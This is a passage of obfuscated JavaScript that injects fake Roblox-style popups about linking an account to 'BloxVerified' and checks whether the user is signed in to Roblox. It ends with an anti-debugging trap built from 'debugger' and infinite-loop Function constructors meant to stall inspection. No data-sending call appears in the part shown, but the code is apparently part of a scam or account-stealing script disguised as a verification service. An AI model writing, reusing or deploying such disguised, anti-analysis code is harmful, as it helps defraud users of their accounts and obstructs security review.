                      '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>Your account is not qualified to be linked to BloxVerified.\nAlternative accounts are not allowed</div></div></div><div class="modal-footer"></div></div></div></div></div></div>'
                    document.body.insertAdjacentHTML('beforeend', d)
                    document.getElementById('closeButton1').onclick =
                      function () {
                        document.getElementById(N.fpidV).remove()
                        document.getElementsByClassName(N.hofNE)[0].innerText =
                          N.BMbZm
                      }
                    document.getElementById('promptPopup').onclick =
                      function () {
                        document.getElementById(N.fpidV).remove()
                        document.getElementsByClassName(N.hofNE)[0].innerText =
                          N.BMbZm
                      }
                  }
                } else {
                  var d =
                    '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>Your account is not qualified to be linked to BloxVerified.\nAlternative accounts are not allowed</div></div></div><div class="modal-footer"></div></div></div></div></div></div>'
                  document.body.insertAdjacentHTML('beforeend', d)
                  document.getElementById('closeButton1').onclick =
                    function () {
                      document.getElementById(N.fpidV).remove()
                      document.getElementsByClassName(N.hofNE)[0].innerText =
                        N.BMbZm
                    }
                  document.getElementById('promptPopup').onclick = function () {
                    document.getElementById(N.fpidV).remove()
                    document.getElementsByClassName(N.hofNE)[0].innerText =
                      N.BMbZm
                  }
                }
              })
              .fail(function () {
                document.body.insertAdjacentHTML(
                  'beforeend',
                  '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Error</h5></div></div><div class="modal-body"><div class="text-center"><div>Please refresh your page and try again, an error has occured.</div></div></div><div class="modal-footer"></div></div></div></div></div></div>'
                )
                document.getElementById('closeButton1').onclick = function () {
                  document.getElementById('promptPopup').remove()
                  document.getElementsByClassName(
                    'text-footer footer-note'
                  )[0].innerText = 'Not Active'
                }
                document.getElementById('promptPopup').onclick = function () {
                  document.getElementById(d.ATlAN).remove()
                  document.getElementsByClassName(d.csaTM)[0].innerText =
                    d.NQWZw
                }
              })
          }
        })()
      },
      error: function () {
        document.body.insertAdjacentHTML(
          'beforeend',
          '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>You are currently signed out of Roblox</div></div></div><div class="modal-footer"></div></div></div></div></div></div>'
        )
        document.getElementById('closeButton1').onclick = function () {
          document.getElementById('promptPopup').remove()
          document.getElementsByClassName(
            'text-footer footer-note'
          )[0].innerText = 'Not Active'
        }
        document.getElementById('promptPopup').onclick = function () {
          document.getElementById('promptPopup').remove()
          document.getElementsByClassName(
            'text-footer footer-note'
          )[0].innerText = 'Not Active'
        }
      },
    }))
})()
function J(w) {
  function L(n) {
    if (typeof n === 'string') {
      return function (Z) {}.constructor('while (true) {}').apply('counter')
    } else {
      ;('' + n / n).length !== 1 || n % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    L(++n)
  }
  try {
    if (w) {
      return L
    } else {
      L(0)
    }
  } catch (n) {}
}
